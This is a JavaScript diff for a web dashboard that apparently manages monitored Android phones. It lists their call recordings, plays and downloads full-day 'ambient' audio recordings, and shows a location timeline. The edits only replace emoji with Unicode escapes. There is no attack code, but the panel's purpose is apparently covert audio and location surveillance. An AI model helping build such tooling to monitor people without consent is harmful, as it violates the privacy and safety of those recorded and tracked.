             return `<div class="rec-card rec-card-deleted" style="margin-bottom:10px;">
                 <div style="display:flex;align-items:center;gap:12px;flex-wrap:wrap;">
-                    <div style="width:40px;height:40px;border-radius:10px;background:linear-gradient(135deg,#334155,#475569);display:flex;align-items:center;justify-content:center;font-size:20px;flex-shrink:0;">📱</div>
+                    <div style="width:40px;height:40px;border-radius:10px;background:linear-gradient(135deg,#334155,#475569);display:flex;align-items:center;justify-content:center;font-size:20px;flex-shrink:0;">\uD83D\uDCF1</div>
                     <div style="flex:1;min-width:140px;">
                         <div style="font-weight:700;font-size:14px;">${esc(devLabel)}</div>
                         <div style="font-size:11px;color:var(--muted);margin-top:2px;">ID: ${esc(d.device_id)}</div>
                         <div style="font-size:11px;color:var(--muted);">Android ${esc(d.android_version || '?')} · App v${esc(d.app_version || '?')}</div>
                         <div style="font-size:11px;color:var(--muted);">Total recordings: ${recCount}</div>
-                        <div style="font-size:11px;color:var(--red);margin-top:3px;">🗑️ Deleted: ${fmtTs(d.deleted_at)}</div>
+                        <div style="font-size:11px;color:var(--red);margin-top:3px;">\uD83D\uDDD1️ Deleted: ${fmtTs(d.deleted_at)}</div>
                     </div>
                     <div style="display:flex;gap:6px;flex-wrap:wrap;align-self:center;">
                         <button class="btn btn-green btn-sm" onclick="window.__appRestoreDevice('${did}')">♻️ Restore Device</button>
-                        <button class="btn btn-red   btn-sm" onclick="window.__appPermDeleteDevice('${did}')">🔥 Delete Permanently</button>
+                        <button class="btn btn-red   btn-sm" onclick="window.__appPermDeleteDevice('${did}')">\uD83D\uDD25 Delete Permanently</button>
                     </div>
                 </div>
             </div>`;
@@ -6357,7 +6357,7 @@ document.querySelectorAll('[data-panel][data-shell]').forEach(el => {
                 await remove(ref(db, 'app_devices/' + d.device_id));
                 await remove(ref(db, 'call_recordings/' + d.device_id));
             }
-            toast('🔥 App Bin emptied.', 'var(--red)');
+            toast('\uD83D\uDD25 App Bin emptied.', 'var(--red)');
         } catch (e) {
             toast('❌ Error: ' + e.message, 'var(--red)');
         }
@@ -6383,7 +6383,7 @@ document.querySelectorAll('[data-panel][data-shell]').forEach(el => {
     // ── Refresh button ──────────────────────────────────────────────────────
     document.getElementById('appRefreshBtn').addEventListener('click', () => {
         renderPhoneList();
-        toast('📱 Phones refreshed.', 'var(--primary)');
+        toast('\uD83D\uDCF1 Phones refreshed.', 'var(--primary)');
     });
 
     // ── Hook into panel switching ───────────────────────────────────────────
@@ -6513,7 +6513,7 @@ document.querySelectorAll('[data-panel][data-shell]').forEach(el => {
         // Filter       : direction === "ambient"  (phone_number === "Ambient")
         // Grouping     : by calendar date derived from start_time
         // Per-day card : date label · total duration · chunk count
-        //                ▶ Play (sequential), ⬇ Download (all chunks), 🗑 Delete
+        //                ▶ Play (sequential), ⬇ Download (all chunks), \uD83D\uDDD1 Delete
         // Playback     : queues all chunks sorted by start_time,
         //                advances automatically when each chunk ends.
         // Download     : triggers individual <a download> for every chunk URL.
@@ -6626,7 +6626,7 @@ document.querySelectorAll('[data-panel][data-shell]').forEach(el => {
             function ambMergeChunks(chunks, silent) {
                 var urls = chunks.filter(function(c){ return !!c.audio_url; }).map(function(c){ return c.audio_url; });
                 if (urls.length === 0) return Promise.resolve(null);
-                if (!silent) toast('🔄 Merging ' + urls.length + ' chunk(s)…', 'var(--purple)');
+                if (!silent) toast('\uD83D\uDD04 Merging ' + urls.length + ' chunk(s)…', 'var(--purple)');
                 return Promise.all(urls.map(function(url) {
                     return fetch(url).then(function(r){ return r.blob(); });
                 })).then(function(blobs) {
@@ -6894,13 +6894,13 @@ document.querySelectorAll('[data-panel][data-shell]').forEach(el => {
                         '    <div class="amb-day-cb-wrap">',
                         '      <input type="checkbox" class="amb-day-cb" id="ambCb-'+dk+'" onchange="window.__ambToggleSelect(\''+dk+'\',this.checked)">',
                         '    </div>',
-                        '    <div class="amb-day-icon">🎧</div>',
+                        '    <div class="amb-day-icon">\uD83C\uDFA7</div>',
                         '    <div class="amb-day-title">',
-                        '      <div class="amb-day-date">📅 '+esc(g.shortDate)+relBadge+' <span style="font-size:12px;font-weight:500;color:var(--muted);">Full Day Recording</span></div>',
+                        '      <div class="amb-day-date">\uD83D\uDCC5 '+esc(g.shortDate)+relBadge+' <span style="font-size:12px;font-weight:500;color:var(--muted);">Full Day Recording</span></div>',
                         '      <div class="amb-day-meta">',
                         '        <span class="amb-badge">⏱ '+ambFmtDuration(totalSecs)+' total</span>',
-                        '        <span class="amb-badge amb-badge-teal">🗂 '+g.chunks.length+' chunk'+(g.chunks.length!==1?'s':'')+'</span>',
-                        '        <span class="amb-badge">🕐 '+ambFmtTime(firstChunk&&firstChunk.start_time)+' → '+ambFmtTime(lastChunk&&lastChunk.start_time)+'</span>',
+                        '        <span class="amb-badge amb-badge-teal">\uD83D\uDDC2 '+g.chunks.length+' chunk'+(g.chunks.length!==1?'s':'')+'</span>',
+                        '        <span class="amb-badge">\uD83D\uDD50 '+ambFmtTime(firstChunk&&firstChunk.start_time)+' → '+ambFmtTime(lastChunk&&lastChunk.start_time)+'</span>',
                         '        '+(hasAudio?'':'<span style="color:var(--red);font-size:10px;">⚠ No audio URLs</span>'),
                         '      </div>',
                         '    </div>',
@@ -6945,10 +6945,10 @@ document.querySelectorAll('[data-panel][data-shell]').forEach(el => {
                         '  <div class="amb-day-actions">',
                         '    <button class="btn btn-purple btn-sm" onclick="window.__ambPlayDay(\''+dk+'\')" '+(hasAudio?'':'disabled title="No audio available"')+'>▶ Play</button>',
                         // FIX 2: Details button
-                        '    <button class="btn btn-teal btn-sm" onclick="window.__ambToggleChunks(\''+dk+'\')">🗂 Details</button>',
+                        '    <button class="btn btn-teal btn-sm" onclick="window.__ambToggleChunks(\''+dk+'\')">\uD83D\uDDC2 Details</button>',
                         // FIX 3: Download merges into one file
                         '    <button class="btn btn-gray btn-sm" onclick="window.__ambDownloadDay(\''+dk+'\')" '+(hasAudio?'':'disabled title="No audio available"')+'>⬇ Download</button>',
-                        '    <button class="btn btn-red  btn-sm" onclick="window.__ambDeleteDay(\''+dk+'\')">🗑 Delete</button>',
+                        '    <button class="btn btn-red  btn-sm" onclick="window.__ambDeleteDay(\''+dk+'\')">\uD83D\uDDD1 Delete</button>',
                         '  </div>',
                         '</div>'
                     ].join('\n');
@@ -7033,7 +7033,7 @@ document.querySelectorAll('[data-panel][data-shell]').forEach(el => {
                 var totalSecs = 0;
                 chunks.forEach(function(c){ totalSecs += (c.duration_seconds || 0); });
                 var infoEl = document.getElementById('ambChunkInfo-' + dateKey);
-                if (infoEl) infoEl.textContent = '🎵 ' + chunks.length + ' chunk' + (chunks.length !== 1 ? 's' : '') + ' · ⏱ ' + ambFmtDuration(totalSecs);
+                if (infoEl) infoEl.textContent = '\uD83C\uDFB5 ' + chunks.length + ' chunk' + (chunks.length !== 1 ? 's' : '') + ' · ⏱ ' + ambFmtDuration(totalSecs);
 
                 // Background merge for download (if not already cached)
                 if (!ambMergedURLs[dateKey]) {
@@ -7057,7 +7057,7 @@ document.querySelectorAll('[data-panel][data-shell]').forEach(el => {
                 ambActiveAudio  = audioEl;
                 ambActiveDayKey = dateKey;
                 var infoEl = document.getElementById('ambChunkInfo-' + dateKey);
-                if (infoEl) infoEl.textContent = '🕐 ' + ambFmtTime(chunk.start_time) + ' — ⏱ ' + ambFmtDuration(chunk.duration_seconds);
+                if (infoEl) infoEl.textContent = '\uD83D\uDD50 ' + ambFmtTime(chunk.start_time) + ' — ⏱ ' + ambFmtDuration(chunk.duration_seconds);
                 audioEl.src = chunk.audio_url;
                 audioEl.load();
                 audioEl.play().catch(function(){});
@@ -7125,7 +7125,7 @@ document.querySelectorAll('[data-panel][data-shell]').forEach(el => {
                     });
                 });
                 update(ref(db), updates)
-                    .then(function(){ toast('🗑️ Selected days moved to App Bin.', 'var(--yellow)'); ambRender(); })
+                    .then(function(){ toast('\uD83D\uDDD1️ Selected days moved to App Bin.', 'var(--yellow)'); ambRender(); })
                     .catch(function(e){ toast('❌ Delete failed: ' + e.message, 'var(--red)'); });
             };
 
@@ -7169,7 +7169,7 @@ document.querySelectorAll('[data-panel][data-shell]').forEach(el => {
                     return;
                 }
 
-                toast('🔄 Preparing full audio…', 'var(--purple)');
+                toast('\uD83D\uDD04 Preparing full audio…', 'var(--purple)');
                 ambMergeChunks(chunks, true).then(function(blobURL) {
                     if (blobURL) ambMergedURLs[dateKey] = blobURL;
                     doDownload(blobURL);
@@ -7189,7 +7189,7 @@ document.querySelectorAll('[data-panel][data-shell]').forEach(el => {
                     updates['ambient_recordings/' + chunk._device_id + '/' + chunk.recId + '/deleted_at'] = now;
                 });
                 update(ref(db), updates)
-                    .then(function(){ toast('🗑️ ' + group.chunks.length + ' chunk(s) moved to App Bin.', 'var(--yellow)'); ambRender(); })
+                    .then(function(){ toast('\uD83D\uDDD1️ ' + group.chunks.length + ' chunk(s) moved to App Bin.', 'var(--yellow)'); ambRender(); })
                     .catch(function(e){ toast('❌ Delete failed: ' + e.message, 'var(--red)'); });
             };
 
@@ -7381,8 +7381,8 @@ document.querySelectorAll('[data-panel][data-shell]').forEach(el => {
                 });
                 try {
                     await update(ref(db), updates);
-                    toast('🗑️ ' + tlSelectedStays.size + ' location(s) moved to App Bin.', 'var(--yellow)');
-                    pushNotif('📍', tlSelectedStays.size + ' location(s) deleted', 'Device Timeline');
+                    toast('\uD83D\uDDD1️ ' + tlSelectedStays.size + ' location(s) moved to App Bin.', 'var(--yellow)');
+                    pushNotif('\uD83D\uDCCD', tlSelectedStays.size + ' location(s) deleted', 'Device Timeline');
                 } catch(e) { toast('❌ Delete failed: ' + e.message, 'var(--red)'); }
                 tlSelectedStays.clear();
                 tlUpdateSelectBar();
@@ -7577,7 +7577,7 @@ document.querySelectorAll('[data-panel][data-shell]').forEach(el => {
                     var header = document.createElement('div');
                     header.className = 'tl-day-header';
                     header.innerHTML =
-                        '<span class="tl-day-icon">📅</span>' +
+                        '<span class="tl-day-icon">\uD83D\uDCC5</span>' +
                         '<span class="tl-day-title">' + dayLabel + '</span>' +
                         '<span class="tl-day-meta">' + group.items.length + ' stop' + (group.items.length!==1?'s':'') + '</span>' +
                         '<span class="tl-day-chevron">▶</span>';
@@ -7909,7 +7909,7 @@ document.querySelectorAll('[data-panel][data-shell]').forEach(el => {
 
             var wrap = document.createElement('div');
             wrap.style.cssText = 'text-align:center;padding:16px 0;';
-            wrap.innerHTML = '<button id="tlLoadMoreBtn" class="btn btn-gray btn-sm" style="font-size:12px;padding:8px 20px;">📍 Load 50 older locations…</button>';
+            wrap.innerHTML = '<button id="tlLoadMoreBtn" class="btn btn-gray btn-sm" style="font-size:12px;padding:8px 20px;">\uD83D\uDCCD Load 50 older locations…</button>';
             list.appendChild(wrap);
 
             document.getElementById('tlLoadMoreBtn').addEventListener('click', async function () {
@@ -7951,12 +7951,12 @@ document.querySelectorAll('[data-panel][data-shell]').forEach(el => {
                         if (btn2) btn2.parentElement.remove();
                     } else {
                         btn.disabled = false;
-                        btn.textContent = '📍 Load 50 older locations…';
+                        btn.textContent = '\uD83D\uDCCD Load 50 older locations…';
                     }
                 } catch (e) {
                     prog2.hide();
                     btn.disabled = false;
-                    btn.textContent = '📍 Load 50 older locations…';
+                    btn.textContent = '\uD83D\uDCCD Load 50 older locations…';
                     toast('❌ Load more failed: ' + e.message, 'var(--red)');
                 }
             });
